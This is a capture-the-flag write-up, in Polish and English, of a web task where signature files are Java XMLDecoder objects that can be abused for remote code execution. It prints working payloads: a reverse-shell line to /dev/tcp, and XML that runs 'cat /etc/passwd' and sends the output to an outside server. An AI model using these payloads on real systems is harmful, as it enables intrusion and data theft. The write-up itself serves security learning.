﻿## sign server (web, 100p)

	document signature is so hot right now! 
	signserver provides you with the most advanced solution to sign and verify your documents. 
	we support any document types and provide you with a unique, ultra-secure signature.

### pl
[eng](#eng-version)

w zadaniu dostępna jest strona, która generuje podpis dla wybranego przez nas pliku, oraz pozwala na weryfikacje takiego podpisu.
istotny fakt jest taki, że pliki z podpisem wyglądają tak:

```xml
<?xml version="1.0" encoding="utf-8"?>
<java version="1.8.0_72-internal" class="java.beans.xmldecoder">
 <object class="models.ctfsignature" id="ctfsignature0">
  <void class="models.ctfsignature" method="getfield">
   <string>hash</string>
   <void method="set">
    <object idref="ctfsignature0"/>
    <string>da39a3ee5e6b4b0d3255bfef95601890afd80709</string>
   </void>
  </void>
  <void class="models.ctfsignature" method="getfield">
   <string>sig</string>
   <void method="set">
    <object idref="ctfsignature0"/>
    <string>12a626d7c85bcc21d9f35302e33914104d8329a0</string>
   </void>
  </void>
 </object>
</java>
```

można więc zauważyć, że serialiazcja obiektu z podpisem, oraz zapewne deserializacja wykorzystaują klasy xmlencoder i xmldecoder.
występuje tu podatność podobna do pythonowego pickle - deserializacja jest w stanie wykonywać praktycznie dowolny kod, o ile plik zostanie odpowiednio przygotowany.

możemy na przykład utworzyć dowolny obiekt używając tagu `<object>` a następnie podając parametry konstruktora, na przykład:

```xml
<object class = "java.io.printwriter">
	<string>reverse.sh</string>
</object>
```
wykona `new printwriter("reverse.sh");`

możemy też wykonywać dowolne metody na takim obiekcie za pomocą tagów `<method>` oraz `<void>` i tak na przykład:

```xml
<object class = "java.io.printwriter">
	<string>reverse.sh</string>
	<method name = "write">
		<string>bash -i >& /dev/tcp/1.2.3.4/1234 0>&1</string>
	</method>
	<method name = "close"/>
</object>
```

wykona kod:

```java
printwriter p = new printwriter("reverse.sh");
p.write("bash -i >& /dev/tcp/1.2.3.4/1234 0>&1");
p.close();
```

tym samym tworząc na serwerze plik z podaną zawartością.

możemy także nadawać "id" tworzonym obiektom i używać ich jako parametrów dla innych obiektów.

```xml
<void class="java.lang.string" id="somestring">
    <string>some data</string>
</void>
<object class = "java.io.printwriter">
	<string>reverse.sh</string>
	<method name = "write">
		<object idref="somestring"/>
	</method>
	<method name = "close"/>
</object>
```

mając takie możliwości przygotowaliśmy exploita który pozwalał nam na wykonanie dowolnego kodu na zdalnej maszynie, a wynik przekazywał jako parametr get wysłany po http do naszego serwera:

```xml
<?xml version="1.0" encoding="utf-8"?>
<java version="1.8.0_72-internal" class="java.beans.xmldecoder">

    <void class="java.lang.string" id="command" method="valueof">
        <object class="java.lang.stringbuilder" id="builder">
            <void class="java.lang.processbuilder">
                <array class="java.lang.string" length="2">
                    <void index="0">
                        <string>cat</string>
                    </void>
                    <void index="1">
                        <string>/etc/passwd</string>
                    </void>
                </array>
                <void method="start" id="process">
                    <void method="getinputstream" id="stream" />
                </void>
                <void class="java.io.bufferedreader" id="bufferedreader">
                    <object class="java.io.inputstreamreader">
                        <object idref="stream"/>
                    </object>
                    <void method="lines" id="lines">
                        <void method="collect" id="collected">
                            <object class="java.util.stream.collectors" method="joining">
								<string>      </string>
							</object>
                        </void>
                    </void>
                </void>
            </void>
            <void method="append">
                <string>http://our.server.net/exp/</string>
            </void>
            <void method="append">
                <object idref="collected"/>
            </void>
        </object>
    </void>

    <object class="java.net.url">
        <object idref="command"/>
        <void method="openstream"/>
    </object>
</java>
```

dzięki temu mogliśmy użyć komendy `find` aby znaleźć plik `flag` a potem wypisać go przez `cat` i uzyskać `flag{ser1l1azati0n_in_ctf_is_fun}`

### eng version

in the task there is a webpage which generates a signature for a selected file, and lets us verify the signature.
it is important to notice that signature files are:

```xml
<?xml version="1.0" encoding="utf-8"?>
<java version="1.8.0_72-internal" class="java.beans.xmldecoder">
 <object class="models.ctfsignature" id="ctfsignature0">
  <void class="models.ctfsignature" method="getfield">
   <string>hash</string>
   <void method="set">
    <object idref="ctfsignature0"/>
    <string>da39a3ee5e6b4b0d3255bfef95601890afd80709</string>
   </void>
  </void>
  <void class="models.ctfsignature" method="getfield">
   <string>sig</string>
   <void method="set">
    <object idref="ctfsignature0"/>
    <string>12a626d7c85bcc21d9f35302e33914104d8329a0</string>
   </void>
  </void>
 </object>
</java>
```

and therefore the signature object serialization, and probably deserialization, is handled by xmlencoder and xmldecoder.
they have the same type of vulnerability as python pickle - deserialization can execute any code as long as the input file is properly prepared.

for example we can create any object using `<object>` tag and then pass the constructor arguments to it, eg:

```xml
<object class = "java.io.printwriter">
	<string>reverse.sh</string>
</object>
```

will execute `new printwriter("reverse.sh");`

we can also call any methods on such objects using `<method>` and `<void>` tags, and therefore:

```xml
<object class = "java.io.printwriter">
	<string>reverse.sh</string>
	<method name = "write">
		<string>bash -i >& /dev/tcp/1.2.3.4/1234 0>&1</string>
	</method>
	<method name = "close"/>
</object>
```

will execute code:

```java
printwriter p = new printwriter("reverse.sh");
p.write("bash -i >& /dev/tcp/1.2.3.4/1234 0>&1");
p.close();
```

creating a file on the server with given contents.

we can also assign "id" to the objects and then use them as parameters of other objects:

```xml
<void class="java.lang.string" id="somestring">
    <string>some data</string>
</void>
<object class = "java.io.printwriter">
	<string>reverse.sh</string>
	<method name = "write">
		<object idref="somestring"/>
	</method>
	<method name = "close"/>
</object>
```

with such capability we created an exploit which lets us execute any code on target machine, and the results are send with http get request to our server:

```xml
<?xml version="1.0" encoding="utf-8"?>
<java version="1.8.0_72-internal" class="java.beans.xmldecoder">

    <void class="java.lang.string" id="command" method="valueof">
        <object class="java.lang.stringbuilder" id="builder">
            <void class="java.lang.processbuilder">
                <array class="java.lang.string" length="2">
                    <void index="0">
                        <string>cat</string>
                    </void>
                    <void index="1">
                        <string>/etc/passwd</string>
                    </void>
                </array>
                <void method="start" id="process">
                    <void method="getinputstream" id="stream" />
                </void>
                <void class="java.io.bufferedreader" id="bufferedreader">
                    <object class="java.io.inputstreamreader">
                        <object idref="stream"/>
                    </object>
                    <void method="lines" id="lines">
                        <void method="collect" id="collected">
                            <object class="java.util.stream.collectors" method="joining">
								<string>      </string>
							</object>
                        </void>
                    </void>
                </void>
            </void>
            <void method="append">
                <string>http://our.server.net/exp/</string>
            </void>
            <void method="append">
                <object idref="collected"/>
            </void>
        </object>
    </void>

    <object class="java.net.url">
        <object idref="command"/>
        <void method="openstream"/>
    </object>
</java>
```

with this we could use `find` command to look for `flag` file and then print it using `cat` and get `flag{ser1l1azati0n_in_ctf_is_fun}`
